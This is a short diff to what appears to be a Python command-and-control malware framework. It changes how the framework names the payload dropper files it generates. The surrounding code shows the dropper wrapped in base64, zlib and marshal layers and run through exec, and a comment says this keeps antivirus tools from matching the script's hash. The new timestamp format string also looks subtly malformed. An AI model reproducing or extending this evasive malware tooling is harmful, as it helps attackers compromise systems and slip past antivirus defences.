@@ -7,6 +7,7 @@ import zlib
 import marshal
 import uuid
 import shutil
+import datetime
 
 class C2:
     def __init__(self, sio):
@@ -155,7 +156,7 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
         #this will prevent anti-viruses from looking for hashes of the script
         
         system = platform.system()
-        payload_file_name = f"payload-{os_name}-{arch}-{uuid.uuid4()}"
+        payload_file_name = f"payload_{os_name}_{arch}_{datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S.f%z")}_{uuid.uuid4()}"
 
         with open(f"{payload_file_name}.py", 'w') as f:
             f.writelines(dropper)
